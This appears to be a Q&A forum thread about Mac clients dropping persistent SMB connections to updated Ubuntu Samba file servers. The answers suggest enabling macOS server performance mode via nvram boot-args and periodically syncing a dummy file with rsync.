The OS versions vary from OS X 10.12 to macOS Catalina, using various flavors of SMB2 to SMB3.\nAny idea how I can begin to understand why the macs are doing this, or any tips on getting them to keep the connections alive?\nThe Mac clients are running jobs that rely on a persistent connection.\n\nHighly relevant to know, but originally left out as I was looking for a workaround:\nI have about a dozen of these servers (mostly Ubuntu 18.04; Samba 4.7.6) running fine for the past several years. Three of them had automatic updates installed, and these three have the issue of the Macs disconnecting. I'm holding back letting the other servers restart for the updates, and the Macs will not drop connections to the non-updated servers.\nAs a test I setup a server to 16.04 to see if and older version of Ubuntu Server would pose the same issue. Surprisingly it has the same problem using a different version of Samba (4.3.11). I will have to do the test again, without letting 16.04 install the latest security updates, in order to confirm my suspicions that those are the cause of the problem.\nThough I suspect something in Ubuntu's core changed, I am asking here since only Macs are affected.\n\nOn a number of Macs with OSes from 10.12 to Catalina I have tried testing them with their default settings, and all possible combinations of changes to /etc/nsmb.conf:\n[default]\nsigning_required=no\nprotocol_vers_map=[see manpage for nsmb.conf (linked below)]\n\nmanpage for nsmb.conf\nI've also tried disabling all sleep and powersaving options, and even using a nice cafffinate wrapper, KeepingYouAwake, to enforce this.\nOn the server I've tried following the advice of another sysadmin on the #macosx freenode channel, kode54, who shared how they eventually got a stable connection.\nThe advice didn't help–well I haven't fully tried it as it requires installing a version of Samba from a PPA for a version of Samba maintained by the Linux for Schools Project–but informed me of vfs_fruit and the fact that there is a developmental effort of extending Samba through an extra package for, in part, dealing with Macs. It also led me to find a page on Samba's wiki discussing difficulties with Macs and server-side workarounds: Configure Samba to Work Better with Mac OS X\nIt's difficult for me to try installing suggested Samba PPA because these servers are fileservers in part only, and are generally always being used for compute jobs that can take days to run (neuroimaging processing). They were built for compute jobs, and do storage almost as a side-effect of the dual-socket, high-memory density, server options also happening to be the servers with the large number of drive bays (16+).\nI'm hoping to try other options before becoming fully negatively disruptive.\nSince none of the server-side options are helping–I've been trying the flags in various combinations no to avail–I am hoping that the Apple community will have some workaround for me.\nAny way of keeping a persistent connection, despite where the issue may originate, would be incredibly valuable.\n\nA: I'd suggest giving a try at the later: https://support.apple.com/en-us/HT202528\nAlthough the use is intended if you'd be using a Mac as file server it nevertheless should provide a higher priority for network I/O on clients.\nRead NVRAM settings:\nnvram boot-args\n\nWill throw the following error if nvram is set to defaults:\n\nnvram: Error getting variable - 'boot-args': (iokit/common) data was not found\n\nTurn on Server Performance Mode (MacOS 10.11 El Capitan and later):\nsudo nvram boot-args=\"serverperfmode=1 $(nvram boot-args 2>/dev/null | cut -f 2-)\"\n\nTo turn off either reset PRAM or:\nsudo nvram boot-args=\"$(nvram boot-args 2>/dev/null | sed -e $'s/boot-args\\t//;s/serverperfmode=1//')\"\n\n\nA: You might have solved the problem by now, the only solution which came to my mind with quick-reading your question again is to create a dummy file and using rsync on mac, schedule to transfer that dummy file somewhere over network. This way the network will be kept alive.\n"]
